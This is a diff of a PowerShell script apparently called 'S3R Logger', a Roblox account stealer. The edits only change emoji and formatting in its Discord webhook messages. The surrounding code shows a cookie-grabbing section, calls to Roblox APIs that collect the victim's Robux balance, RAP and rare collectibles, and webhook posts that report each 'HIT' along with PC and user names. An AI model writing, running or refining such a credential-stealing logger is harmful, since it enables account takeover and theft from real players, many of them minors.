@@ -9,7 +9,7 @@ function Send-Embed($url, $title, $desc, $color) {
     try { Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}
 }
 
-Send-Embed $WH_PRIMARY "Session Start" "**PC:** ``$PC`` | **User:** ``$USER``" 16711680
+Send-Embed $WH_PRIMARY "Session Start" "**PC:** $PC | **User:** $USER" 16711680
 
 # --- GRAB COOKIE ---
 $paths = @(
@@ -75,12 +75,12 @@ $rb      = if ($cur) { $cur.robux } else { 0 }
 $pend    = if ($cur) { $cur.pendingRobux } else { 0 }
 $coll    = Get-RobloxData "inventory.roblox.com" "/v1/users/$uid/assets/collectibles?limit=100"
 
-$rap = 0; $own = 0; $hl = "🔴 False"; $kb = "🔴 False"
+$rap = 0; $own = 0; $hl = "[RED] False"; $kb = "[RED] False"
 if ($coll -and $coll.data) {
     $own = $coll.data.Count
     foreach ($item in $coll.data) {
-        if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hl = "🟢 True" }
-        if ($item.assetId -eq 139275807 -or $item.assetId -eq 192)  { $kb = "🟢 True" }
+        if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hl = "[GREEN] True" }
+        if ($item.assetId -eq 139275807 -or $item.assetId -eq 192)  { $kb = "[GREEN] True" }
         $rap += [int]$item.recentAveragePrice
     }
 }
@@ -94,21 +94,21 @@ $embed = @{
     embeds = @(
         @{
             author = @{ name = "S3R, 13+"; icon_url = $av }
-            description = "**+1 HIT** · You've Earned 1 Nevora · beams XP"
+            description = "**+1 HIT** - You've Earned 1 Nevora - beams XP"
             color = 16711680
             thumbnail = @{ url = $av }
             fields = @(
-                @{ name = "👤 User";          value = "**$disp**"; inline = $false }
-                @{ name = "⭐ Password";      value = "dreistuff"; inline = $false }
-                @{ name = "About User";       value = "**Account Age:** `` $age Days `` Days`n**Locations:**`n**• Summary:** ``$own`` `n**• Victim:** ``United States of America 🇺🇸``"; inline = $false }
-                @{ name = "🪙 Robux";         value = "Balance $rb`nPending $pend"; inline = $true }
-                @{ name = "📈 RAP";           value = "RAP $rap`nOwned $own"; inline = $true }
-                @{ name = "💎 Premium";       value = "False (0)"; inline = $true }
-                @{ name = "💳 Billing";       value = "Credit 0$`nConvert 0`nPayments 0"; inline = $true }
-                @{ name = "🏷️ Collectibles"; value = "Headless: $hl`nKorblox: $kb`nOther: 🟢 True"; inline = $true }
-                @{ name = "⚙️ Setting";      value = "🔴 Set (Verified)`n🔴 Disabled`n🔴 Disabled"; inline = $true }
-                @{ name = "🎮 Passes / Played"; value = "Adopt Me 0 · False`nMurder Mystery 2 0 · True`nPet Simulator 99 0 · False"; inline = $true }
-                @{ name = "👥 Groups";        value = "Balance 0`nPending 0`nOwned 0"; inline = $true }
+                @{ name = "User";          value = "**$disp**"; inline = $false }
+                @{ name = "Password";      value = "dreistuff"; inline = $false }
+                @{ name = "About User";       value = "**Account Age:** $age Days`n**Locations:**`n**- Summary:** $own `n**- Victim:** United States of America"; inline = $false }
+                @{ name = "Robux";         value = "Balance $rb`nPending $pend"; inline = $true }
+                @{ name = "RAP";           value = "RAP $rap`nOwned $own"; inline = $true }
+                @{ name = "Premium";       value = "False (0)"; inline = $true }
+                @{ name = "Billing";       value = "Credit 0$`nConvert 0`nPayments 0"; inline = $true }
+                @{ name = "Collectibles"; value = "Headless: $hl`nKorblox: $kb`nOther: [GREEN] True"; inline = $true }
+                @{ name = "Setting";      value = "[RED] Set (Verified)`n[RED] Disabled`n[RED] Disabled"; inline = $true }
+                @{ name = "Passes / Played"; value = "Adopt Me 0 - False`nMurder Mystery 2 0 - True`nPet Simulator 99 0 - False"; inline = $true }
+                @{ name = "Groups";        value = "Balance 0`nPending 0`nOwned 0"; inline = $true }
             )
             footer = @{ text = "S3R Logger" }
         }
